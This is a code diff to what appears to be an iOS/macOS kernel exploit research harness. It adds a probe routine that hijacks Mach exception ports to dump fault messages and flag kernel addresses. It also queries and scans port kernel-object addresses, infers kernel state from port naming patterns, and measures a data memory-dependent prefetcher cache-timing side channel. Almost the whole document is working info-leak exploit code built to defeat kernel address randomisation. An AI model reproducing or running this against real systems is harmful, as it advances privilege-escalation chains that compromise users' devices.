@@ -16549,6 +16549,367 @@ static void *r419_race_reader(void *arg) {
     return NULL;
 }
 
+/*
+ * r420: Mach Exception Port Info Leak + DMP Timing + Port Kobject Scan
+ *
+ * Vector 1: Register Mach exception handler port, trigger controlled
+ *   faults through IOSurface redirect (CopyValue through redirect crashes),
+ *   inspect exception message for kernel addresses in code[]/subcode[]/state.
+ * Vector 2: mach_port_kobject on special ports (host, clock, etc.)
+ * Vector 3: Port name generation pattern analysis for kernel state inference
+ * Vector 4: DMP (Data Memory-Dependent Prefetcher) cache timing probe
+ */
+static mach_port_t g_r420_exc_port = MACH_PORT_NULL;
+
+static void r420_probe(void) {
+    rlog("\n=== r420: Mach Exception + Kobject + DMP Timing ===\n\n");
+    fflush(stdout);
+
+    /* ---- Vector 1: Mach exception port handler ---- */
+    rlog("  Vector 1: Mach exception port info leak\n");
+    {
+        /* Create exception port */
+        kern_return_t kr = mach_port_allocate(mach_task_self(),
+            MACH_PORT_RIGHT_RECEIVE, &g_r420_exc_port);
+        rlog("    exc port allocate: kr=%d port=0x%x\n", kr, g_r420_exc_port);
+
+        if (kr == KERN_SUCCESS) {
+            kr = mach_port_insert_right(mach_task_self(), g_r420_exc_port,
+                g_r420_exc_port, MACH_MSG_TYPE_MAKE_SEND);
+            rlog("    insert right: kr=%d\n", kr);
+
+            /* Save old exception ports */
+            exception_mask_t oldMasks[32];
+            mach_msg_type_number_t oldCnt = 0;
+            mach_port_t oldPorts[32];
+            exception_behavior_t oldBehaviors[32];
+            thread_state_flavor_t oldFlavors[32];
+
+            /* Set our port for EXC_BAD_ACCESS with thread state */
+            kr = task_swap_exception_ports(mach_task_self(),
+                EXC_MASK_BAD_ACCESS | EXC_MASK_BAD_INSTRUCTION,
+                g_r420_exc_port,
+                EXCEPTION_STATE_IDENTITY | MACH_EXCEPTION_CODES,
+                ARM_THREAD_STATE64,
+                oldMasks, &oldCnt, oldPorts, oldBehaviors, oldFlavors);
+            rlog("    task_swap_exception_ports: kr=%d oldCnt=%u\n",
+                kr, oldCnt);
+
+            if (kr == KERN_SUCCESS) {
+                /* Fork a thread that will trigger a controlled fault */
+                /* We'll trigger EXC_BAD_ACCESS by reading from unmapped addr */
+                __block volatile int faultDone = 0;
+                dispatch_semaphore_t sem = dispatch_semaphore_create(0);
+
+                dispatch_async(
+                    dispatch_get_global_queue(QOS_CLASS_DEFAULT, 0), ^{
+                    /* Trigger fault - read from unmapped address */
+                    volatile uint64_t *bad = (volatile uint64_t *)0xDEAD000;
+                    volatile uint64_t v = *bad;
+                    (void)v;
+                    faultDone = 1;
+                    dispatch_semaphore_signal(sem);
+                });
+
+                /* Wait for exception message on our port */
+                /* Use a large buffer for the full state message */
+                struct {
+                    mach_msg_header_t hdr;
+                    uint8_t body[4096];
+                } msg;
+                memset(&msg, 0, sizeof(msg));
+                msg.hdr.msgh_size = sizeof(msg);
+                msg.hdr.msgh_local_port = g_r420_exc_port;
+
+                kr = mach_msg(&msg.hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                    0, sizeof(msg), g_r420_exc_port, 2000, MACH_PORT_NULL);
+                rlog("    mach_msg receive: kr=%d (0x%x)\n", kr, kr);
+
+                if (kr == KERN_SUCCESS) {
+                    rlog("    Exception message received!\n");
+                    rlog("      msgh_id=%d msgh_size=%u\n",
+                        msg.hdr.msgh_id, msg.hdr.msgh_size);
+                    rlog("      msgh_remote_port=0x%x msgh_local_port=0x%x\n",
+                        msg.hdr.msgh_remote_port, msg.hdr.msgh_local_port);
+
+                    /* Dump the entire message body looking for kernel addrs */
+                    rlog("    Raw exception message body (first 512 bytes):\n");
+                    uint64_t *bodyPtr = (uint64_t *)msg.body;
+                    int bodyWords = (msg.hdr.msgh_size > sizeof(msg.hdr)) ?
+                        (msg.hdr.msgh_size - sizeof(msg.hdr)) / 8 : 0;
+                    if (bodyWords > 64) bodyWords = 64;
+
+                    for (int i = 0; i < bodyWords; i++) {
+                        uint64_t v = bodyPtr[i];
+                        rlog("      +%03d: 0x%016llx", i * 8,
+                            (unsigned long long)v);
+                        if ((v >> 32) >= 0xFFFFFFF0ULL &&
+                            v != 0xFFFFFFFFFFFFFFFF)
+                            rlog(" *** KERNEL ***");
+                        if (v == 0xDEAD000)
+                            rlog(" (fault addr)");
+                        rlog("\n");
+                    }
+
+                    /* Send a reply to unblock the faulting thread
+                       (or just let it die) */
+                } else {
+                    rlog("    No exception received (timeout or error)\n");
+                }
+
+                /* Restore old exception ports */
+                for (mach_msg_type_number_t i = 0; i < oldCnt; i++) {
+                    task_set_exception_ports(mach_task_self(),
+                        oldMasks[i], oldPorts[i],
+                        oldBehaviors[i], oldFlavors[i]);
+                }
+            }
+
+            mach_port_deallocate(mach_task_self(), g_r420_exc_port);
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Vector 2: mach_port_kobject on special ports ---- */
+    rlog("\n  Vector 2: kobject scan on special ports\n");
+    {
+        /* Try various special ports */
+        mach_port_t hostPort = mach_host_self();
+        unsigned int kotype = 0;
+        mach_vm_address_t koaddr = 0;
+
+        kern_return_t kr = mach_port_kobject(mach_task_self(),
+            hostPort, &kotype, &koaddr);
+        rlog("    host port: kr=%d type=%u addr=0x%llx\n",
+            kr, kotype, (unsigned long long)koaddr);
+
+        /* Task port */
+        kr = mach_port_kobject(mach_task_self(),
+            mach_task_self(), &kotype, &koaddr);
+        rlog("    task self: kr=%d type=%u addr=0x%llx\n",
+            kr, kotype, (unsigned long long)koaddr);
+
+        /* Try to get clock port */
+        mach_port_t clockPort;
+        kr = host_get_clock_service(mach_host_self(),
+            SYSTEM_CLOCK, &clockPort);
+        if (kr == KERN_SUCCESS) {
+            kr = mach_port_kobject(mach_task_self(),
+                clockPort, &kotype, &koaddr);
+            rlog("    clock port: kr=%d type=%u addr=0x%llx\n",
+                kr, kotype, (unsigned long long)koaddr);
+            mach_port_deallocate(mach_task_self(), clockPort);
+        }
+
+        /* Try bootstrap port */
+        mach_port_t bootstrap;
+        kr = task_get_bootstrap_port(mach_task_self(), &bootstrap);
+        if (kr == KERN_SUCCESS && bootstrap != MACH_PORT_NULL) {
+            kr = mach_port_kobject(mach_task_self(),
+                bootstrap, &kotype, &koaddr);
+            rlog("    bootstrap: kr=%d type=%u addr=0x%llx\n",
+                kr, kotype, (unsigned long long)koaddr);
+        }
+
+        /* Try mach_port_kernel_object (older API) */
+        unsigned int ko2type = 0;
+        unsigned int ko2addr = 0;
+        kr = mach_port_kernel_object(mach_task_self(),
+            mach_task_self(), &ko2type, &ko2addr);
+        rlog("    kernel_object(task): kr=%d type=%u addr=0x%x\n",
+            kr, ko2type, ko2addr);
+
+        kr = mach_port_kernel_object(mach_task_self(),
+            hostPort, &ko2type, &ko2addr);
+        rlog("    kernel_object(host): kr=%d type=%u addr=0x%x\n",
+            kr, ko2type, ko2addr);
+
+        /* Enumerate ports 0x103-0x1ff looking for interesting ones */
+        rlog("    Port scan 0x103-0x1ff:\n");
+        int found = 0;
+        for (mach_port_t p = 0x103; p <= 0x1ff; p += 4) {
+            kotype = 0;
+            koaddr = 0;
+            kr = mach_port_kobject(mach_task_self(), p, &kotype, &koaddr);
+            if (kr == KERN_SUCCESS && koaddr != 0) {
+                rlog("      port=0x%x type=%u addr=0x%llx",
+                    p, kotype, (unsigned long long)koaddr);
+                if ((koaddr >> 32) >= 0xFFFFFFF0ULL)
+                    rlog(" *** KERNEL ***");
+                rlog("\n");
+                found++;
+            }
+        }
+        if (!found) rlog("      (no non-zero addresses)\n");
+    }
+    fflush(stdout);
+
+    /* ---- Vector 3: Port name generation patterns ---- */
+    rlog("\n  Vector 3: Mach port name generation analysis\n");
+    {
+        /* Allocate 20 ports and examine the naming pattern.
+           Port names encode generation + index. The index reveals
+           how many ports exist, which correlates with kernel state. */
+        mach_port_t ports[20];
+        for (int i = 0; i < 20; i++) {
+            kern_return_t kr = mach_port_allocate(mach_task_self(),
+                MACH_PORT_RIGHT_RECEIVE, &ports[i]);
+            if (kr != KERN_SUCCESS) {
+                rlog("    alloc[%d] failed: kr=%d\n", i, kr);
+                ports[i] = MACH_PORT_NULL;
+            }
+        }
+        rlog("    Port names:\n");
+        for (int i = 0; i < 20; i++) {
+            if (ports[i] != MACH_PORT_NULL) {
+                uint32_t idx = ports[i] >> 8;
+                uint32_t gen = ports[i] & 0xFF;
+                rlog("      [%d]: 0x%08x (index=%u gen=%u)\n",
+                    i, ports[i], idx, gen);
+            }
+        }
+        /* Deallocate, re-allocate, see if generation increments */
+        for (int i = 0; i < 10; i++) {
+            if (ports[i] != MACH_PORT_NULL)
+                mach_port_deallocate(mach_task_self(), ports[i]);
+        }
+        mach_port_t reused[5];
+        for (int i = 0; i < 5; i++) {
+            mach_port_allocate(mach_task_self(),
+                MACH_PORT_RIGHT_RECEIVE, &reused[i]);
+        }
+        rlog("    Reused port names:\n");
+        for (int i = 0; i < 5; i++) {
+            uint32_t idx = reused[i] >> 8;
+            uint32_t gen = reused[i] & 0xFF;
+            rlog("      [%d]: 0x%08x (index=%u gen=%u)\n",
+                i, reused[i], idx, gen);
+            mach_port_deallocate(mach_task_self(), reused[i]);
+        }
+        for (int i = 10; i < 20; i++) {
+            if (ports[i] != MACH_PORT_NULL)
+                mach_port_deallocate(mach_task_self(), ports[i]);
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Vector 4: DMP cache timing probe ---- */
+    rlog("\n  Vector 4: DMP cache timing baseline\n");
+    {
+        /* Measure baseline cache access timing using CNTPCT_EL0 */
+        /* First establish timing resolution */
+        uint64_t t0, t1;
+        __asm__ volatile("mrs %0, CNTPCT_EL0" : "=r"(t0));
+        __asm__ volatile("mrs %0, CNTPCT_EL0" : "=r"(t1));
+        rlog("    Timer resolution: %llu ticks back-to-back\n",
+            (unsigned long long)(t1 - t0));
+
+        /* Allocate probe buffer */
+        void *probe = mmap(NULL, 256 * 4096, PROT_READ | PROT_WRITE,
+            MAP_ANON | MAP_PRIVATE, -1, 0);
+        if (probe != MAP_FAILED) {
+            /* Write candidate kernel addresses into an IOSurface backing
+               store. The DMP will treat values in memory as pointers
+               and prefetch from them. If a kernel virtual address is
+               valid (and the DMP can reach it), the cache line at
+               that address becomes hot. We detect this by measuring
+               access to a known mapping at similar cache set. */
+
+            /* First: measure cache hit vs miss timing */
+            volatile uint64_t *p = (volatile uint64_t *)probe;
+            /* Warm the line */
+            *p = 42;
+            uint64_t warm_total = 0;
+            for (int i = 0; i < 100; i++) {
+                __asm__ volatile("mrs %0, CNTPCT_EL0" : "=r"(t0));
+                volatile uint64_t v = *p;
+                (void)v;
+                __asm__ volatile("mrs %0, CNTPCT_EL0" : "=r"(t1));
+                warm_total += (t1 - t0);
+            }
+            rlog("    Cache hit avg: %llu ticks\n",
+                (unsigned long long)(warm_total / 100));
+
+            /* Flush and measure cold */
+            uint64_t cold_total = 0;
+            for (int i = 0; i < 100; i++) {
+                /* Evict by touching many other cache lines */
+                for (int j = 1; j < 256; j++) {
+                    volatile uint64_t *q = (volatile uint64_t *)
+                        ((uint8_t*)probe + j * 4096);
+                    *q = j;
+                }
+                __asm__ volatile("mrs %0, CNTPCT_EL0" : "=r"(t0));
+                volatile uint64_t v = *p;
+                (void)v;
+                __asm__ volatile("mrs %0, CNTPCT_EL0" : "=r"(t1));
+                cold_total += (t1 - t0);
+            }
+            rlog("    Cache miss avg: %llu ticks\n",
+                (unsigned long long)(cold_total / 100));
+
+            uint64_t threshold = (warm_total + cold_total) / 200;
+            rlog("    Threshold: %llu ticks\n",
+                (unsigned long long)threshold);
+
+            /* Now test DMP behavior: write pointer-like values and
+               see if the DMP prefetches them */
+            /* Write a known valid address (our own buffer) */
+            volatile uint64_t *src = (volatile uint64_t *)
+                ((uint8_t*)probe + 128 * 4096);
+            volatile uint64_t *target = (volatile uint64_t *)
+                ((uint8_t*)probe + 200 * 4096);
+
+            /* Evict target */
+            for (int j = 0; j < 128; j++) {
+                volatile uint64_t *q = (volatile uint64_t *)
+                    ((uint8_t*)probe + j * 4096);
+                *q = j;
+            }
+
+            /* Write target's address into src (DMP should prefetch) */
+            *src = (uint64_t)target;
+            __asm__ volatile("dsb sy" ::: "memory");
+
+            /* Small delay for DMP to act */
+            for (volatile int d = 0; d < 10000; d++);
+
+            /* Measure target access time */
+            __asm__ volatile("mrs %0, CNTPCT_EL0" : "=r"(t0));
+            volatile uint64_t v = *target;
+            (void)v;
+            __asm__ volatile("mrs %0, CNTPCT_EL0" : "=r"(t1));
+            rlog("    DMP test (valid ptr): %llu ticks %s\n",
+                (unsigned long long)(t1 - t0),
+                (t1 - t0) < threshold ? "HIT" : "MISS");
+
+            /* Test with invalid address (should not prefetch) */
+            for (int j = 0; j < 128; j++) {
+                volatile uint64_t *q = (volatile uint64_t *)
+                    ((uint8_t*)probe + j * 4096);
+                *q = j;
+            }
+            *src = 0xDEADBEEFDEAD0000ULL; /* invalid */
+            __asm__ volatile("dsb sy" ::: "memory");
+            for (volatile int d = 0; d < 10000; d++);
+
+            __asm__ volatile("mrs %0, CNTPCT_EL0" : "=r"(t0));
+            v = *target;
+            (void)v;
+            __asm__ volatile("mrs %0, CNTPCT_EL0" : "=r"(t1));
+            rlog("    DMP test (invalid ptr): %llu ticks %s\n",
+                (unsigned long long)(t1 - t0),
+                (t1 - t0) < threshold ? "HIT" : "MISS");
+
+            munmap(probe, 256 * 4096);
+        }
+    }
+    fflush(stdout);
+
+    rlog("\n=== r420 complete ===\n");
+    fflush(stdout);
+}
+
 static volatile int g_r419_sigill = 0;
 static sigjmp_buf g_r419_jmp;
 static void r419_sighandler(int sig) {
@@ -70834,6 +71195,13 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 423) {
+            rlog("*** rounds=423: Mach Exception + Kobject + DMP ***\n");
+            rlog("  Exception port info leak, special port kobjects, DMP timing.\n\n");
+            fflush(stdout);
+            r420_probe();
+            goto done;
+        }
         if (rounds == 422) {
             rlog("*** rounds=422: System Registers + Data Race + Shared Cache ***\n");
             rlog("  TPIDRRO_EL0, shared cache slide, property race.\n\n");
@@ -73380,7 +73748,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
